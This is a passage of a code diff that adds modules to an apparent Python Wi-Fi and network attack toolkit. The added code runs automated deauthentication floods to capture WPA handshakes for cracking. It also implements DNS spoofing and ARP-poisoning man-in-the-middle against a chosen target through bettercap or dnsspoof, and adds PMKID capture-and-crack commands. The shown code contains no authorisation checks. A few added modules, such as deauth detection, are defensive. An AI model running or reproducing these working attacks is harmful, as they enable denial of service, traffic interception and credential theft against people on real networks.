+        essid = ap.get("essid", "unknown").replace(" ", "_").replace("/", "_")
+        ch = ap.get("channel", "6").strip()
+        cap_prefix = os.path.join(out_dir, f"hunt_{essid}_{bssid.replace(':','')}")
+
+        info(f"\n  Targeting {bssid} ({essid}) on ch{ch}...")
+
+        # Lock channel
+        run(f"iwconfig {mon} channel {ch} 2>/dev/null")
+
+        # Start capture
+        cap_proc = subprocess.Popen(
+            f"airodump-ng {mon} --bssid {bssid} --channel {ch} --write \"{cap_prefix}\" --output-format cap -a",
+            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+        )
+
+        # Send deauth bursts every 5s
+        deadline = time.time() + capture_per_ap
+        handshake_found = False
+        while time.time() < deadline:
+            run(f"aireplay-ng --deauth 5 -a {bssid} {mon} 2>/dev/null")
+            time.sleep(5)
+            # Check if handshake captured
+            cap_file_check = f"{cap_prefix}-01.cap"
+            if os.path.exists(cap_file_check):
+                o, _, _ = run(f"aircrack-ng \"{cap_file_check}\" 2>&1")
+                if "handshake" in o.lower() and "1 handshake" in o.lower():
+                    handshake_found = True
+                    break
+
+        cap_proc.terminate()
+        cap_proc.wait()
+
+        cap_file_final = f"{cap_prefix}-01.cap"
+        if handshake_found:
+            ok(f"  HANDSHAKE captured: {cap_file_final}")
+            captured.append({"bssid": bssid, "essid": essid, "cap": cap_file_final, "channel": ch})
+        else:
+            warn(f"  No handshake captured for {bssid}")
+
+    print()
+    ok(f"Hunt complete: {len(captured)}/{len(targets)} handshakes captured")
+    if captured:
+        for c in captured:
+            info(f"  {c['bssid']}  \"{c['essid']}\"  -> {c['cap']}")
+        info(f"Crack with: ghost-wifi.py crack --cap <file> --wordlist rockyou.txt")
+
+    if args.output:
+        save_json({
+            "hunted": captured,
+            "targets_tried": len(targets),
+            "out_dir": out_dir,
+            "scan_time": datetime.now().isoformat()
+        }, os.path.join(out_dir, "hunt_results.json"))
+
+
+# ─── Module: dns-spoof ────────────────────────────────────────────────────────
+
+def cmd_dns_spoof(args):
+    if not args.no_banner:
+        print_banner()
+    require_root()
+
+    redirect_ip = args.redirect_ip
+    domains = getattr(args, "domains", None)
+    iface = args.interface
+
+    if not iface:
+        out, _, _ = run("ip route show default 2>/dev/null")
+        m = re.search(r"dev (\S+)", out)
+        iface = m.group(1) if m else None
+        if not iface:
+            err("Could not detect interface. Use -i/--interface.")
+            sys.exit(1)
+
+    if shutil.which("bettercap"):
+        _dns_spoof_bettercap(args, iface, redirect_ip, domains)
+    elif shutil.which("dnsspoof"):
+        _dns_spoof_dnsspoof(args, iface, redirect_ip, domains)
+    else:
+        err("Neither bettercap nor dnsspoof found.")
+        info("Install: sudo apt install bettercap  OR  sudo apt install dsniff")
+        sys.exit(1)
+
+
+def _dns_spoof_bettercap(args, iface, redirect_ip, domains):
+    # Build bettercap caplet
+    cap_file = tempfile.mktemp(suffix=".cap")
+    target = getattr(args, "target", None)
+
+    lines = [
+        f"set dns.spoof.domains {domains or '*'}",
+        f"set dns.spoof.address {redirect_ip}",
+        f"set dns.spoof.all true",
+        "dns.spoof on",
+    ]
+
+    if target:
+        lines.insert(0, f"set arp.spoof.targets {target}")
+        lines.insert(0, "arp.spoof on")
+        info(f"ARP+DNS spoof targeting {target}")
+    else:
+        warn("No --target specified - DNS spoof only (requires being in path already)")
+
+    with open(cap_file, "w") as f:
+        f.write("\n".join(lines) + "\n")
+
+    domain_str = domains or "*"
+    info(f"DNS spoofing domain(s): {domain_str} -> {redirect_ip}")
+    info(f"Interface: {iface}")
+    info("Starting bettercap... Ctrl+C to stop.")
+
+    try:
+        subprocess.run(
+            f"bettercap -iface {iface} -caplet \"{cap_file}\"",
+            shell=True
+        )
+    except KeyboardInterrupt:
+        pass
+    finally:
+        if os.path.exists(cap_file):
+            os.unlink(cap_file)
+        ok("DNS spoof stopped.")
+
+
+def _dns_spoof_dnsspoof(args, iface, redirect_ip, domains):
+    # Build dnsspoof hosts file
+    hosts_file = tempfile.mktemp(suffix=".hosts")
+    domain_list = [d.strip() for d in domains.split(",")] if domains else ["*"]
+
+    with open(hosts_file, "w") as f:
+        for d in domain_list:
+            f.write(f"{redirect_ip} {d}\n")
+            if not d.startswith("*."):
+                f.write(f"{redirect_ip} *.{d}\n")
+
+    target = getattr(args, "target", None)
+    target_flag = f"host {target}" if target else ""
+
+    info(f"DNS spoofing via dnsspoof: {domains or '*'} -> {redirect_ip}")
+    info(f"Hosts file: {hosts_file}")
+    info("Starting dnsspoof... Ctrl+C to stop.")
+
+    try:
+        subprocess.run(
+            f"dnsspoof -i {iface} -f \"{hosts_file}\" {target_flag}",
+            shell=True
+        )
+    except KeyboardInterrupt:
+        pass
+    finally:
+        if os.path.exists(hosts_file):
+            os.unlink(hosts_file)
+        ok("DNS spoof stopped.")
+
+
 # ─── Built-in mini wordlist ───────────────────────────────────────────────────
 
 MINI_WORDLIST = [
@@ -2840,6 +3794,72 @@ def build_parser():
     di.add_argument("--tx-power", dest="tx_power", type=float, default=-50,
                     help="Reference TX power at 1m in dBm (default: -50)")
 
+    # v3.2.0 new modules
+    wm = sub.add_parser("wifi-map", help="ASCII topology map of APs and associated clients")
+    wm.add_argument("-i", "--interface", help="Monitor interface (auto-detect if omitted)")
+    wm.add_argument("--duration", type=int, default=20, help="Scan duration in seconds (default: 20)")
+    wm.add_argument("--band", choices=["a", "b", "abg"], help="Band filter")
+    wm.add_argument("--top", type=int, help="Show only top N APs by signal")
+    wm.add_argument("-o", "--output", help="Save JSON results to file")
+
+    cs = sub.add_parser("channel-survey", help="Channel utilization chart for 2.4GHz and 5GHz")
+    cs.add_argument("-i", "--interface", help="Wireless interface (auto-detect if omitted)")
+    cs.add_argument("-o", "--output", help="Save JSON results to file")
+
+    aw = sub.add_parser("ap-watch", help="Monitor for AP appearance/disappearance events")
+    aw.add_argument("-i", "--interface", help="Wireless interface (auto-detect if omitted)")
+    aw.add_argument("--interval", type=int, default=10, help="Scan interval in seconds (default: 10)")
+    aw.add_argument("--bssid", help="Alert only on matching BSSID (partial match)")
+    aw.add_argument("--essid", help="Alert only on matching ESSID (partial match)")
+    aw.add_argument("--new-only", action="store_true", help="Alert only on new APs")
+    aw.add_argument("--gone-only", action="store_true", help="Alert only on disappeared APs")
+    aw.add_argument("-o", "--output", help="Save events to JSON file")
+
+    pa = sub.add_parser("pcap-analyze", help="Analyze .cap/.pcap file for handshakes, PMKIDs and stats")
+    pa.add_argument("cap", help="Path to capture file (.cap/.pcap)")
+    pa.add_argument("-o", "--output", help="Save analysis results to JSON file")
+
+    pc = sub.add_parser("pmkid-crack", help="All-in-one PMKID capture -> convert -> crack pipeline")
+    pc.add_argument("-i", "--interface", help="Monitor interface (auto-detect if omitted)")
+    pc.add_argument("--duration", type=int, default=60, help="Capture duration in seconds (default: 60)")
+    pc.add_argument("--bssid", help="Target specific BSSID")
+    pc.add_argument("--wordlist", help="Path to wordlist for cracking")
+    pc.add_argument("-o", "--output", help="Base path for output files (no extension)")
+
+    dd = sub.add_parser("deauth-detect", help="Passive detection of deauthentication attack storms")
+    dd.add_argument("-i", "--interface", help="Monitor interface (auto-detect if omitted)")
+    dd.add_argument("--threshold", type=int, default=5, help="Deauth frames/s threshold to alert (default: 5)")
+    dd.add_argument("--duration", type=int, default=0, help="Run duration in seconds (0=until Ctrl+C)")
+    dd.add_argument("-o", "--output", help="Save events to JSON file")
+
+    am = sub.add_parser("arp-mitm", help="ARP poisoning MITM between target and gateway")
+    am.add_argument("-i", "--interface", help="Network interface (auto-detect default route)")
+    am.add_argument("--target", help="Target IP to intercept (omit for entire subnet)")
+    am.add_argument("--gateway", help="Gateway IP (auto-detect if omitted)")
+    am.add_argument("--dump", action="store_true", help="Dump intercepted traffic to pcap via tcpdump")
+    am.add_argument("--capture-port", dest="capture_port", type=int, help="Redirect this port with iptables")
+    am.add_argument("-o", "--output", help="Output pcap file path (used with --dump)")
+
+    hh = sub.add_parser("handshake-hunt", help="Automated multi-AP handshake collector with deauth")
+    hh.add_argument("-i", "--interface", help="Monitor interface (auto-detect if omitted)")
+    hh.add_argument("--scan-duration", dest="scan_duration", type=int, default=20,
+                    help="Initial scan duration in seconds (default: 20)")
+    hh.add_argument("--capture-timeout", dest="capture_timeout", type=int, default=30,
+                    help="Capture time per AP in seconds (default: 30)")
+    hh.add_argument("--max-targets", dest="max_targets", type=int, default=5,
+                    help="Maximum number of APs to target (default: 5)")
+    hh.add_argument("--min-signal", dest="min_signal", type=int, default=-80,
+                    help="Minimum signal strength dBm (default: -80)")
+    hh.add_argument("--enc-filter", dest="enc_filter", help="Only target APs with this encryption (e.g. WPA2)")
+    hh.add_argument("-o", "--output", help="Output directory for capture files")
+
+    ds = sub.add_parser("dns-spoof", help="DNS spoofing via bettercap or dnsspoof")
+    ds.add_argument("-i", "--interface", help="Network interface (auto-detect default route)")
+    ds.add_argument("--redirect-ip", dest="redirect_ip", required=True,
+                    help="IP address to redirect DNS queries to")
+    ds.add_argument("--domains", help="Comma-separated domain(s) to spoof (default: * all)")
+    ds.add_argument("--target", help="Target IP for ARP+DNS combined attack")
+
     return p
 
 # ─── Entry point ──────────────────────────────────────────────────────────────
@@ -2877,6 +3897,16 @@ COMMANDS = {
     # v3.1.0 - DEDSEC_WI-FIDAR inspired
     "radar":           cmd_radar,
     "distance":        cmd_distance,
+    # v3.2.0 - advanced modules
+    "wifi-map":        cmd_wifi_map,
+    "channel-survey":  cmd_channel_survey,
+    "ap-watch":        cmd_ap_watch,
+    "pcap-analyze":    cmd_pcap_analyze,
+    "pmkid-crack":     cmd_pmkid_crack,
+    "deauth-detect":   cmd_deauth_detect,
+    "arp-mitm":        cmd_arp_mitm,
+    "handshake-hunt":  cmd_handshake_hunt,
+    "dns-spoof":       cmd_dns_spoof,
 }
 
 def main():
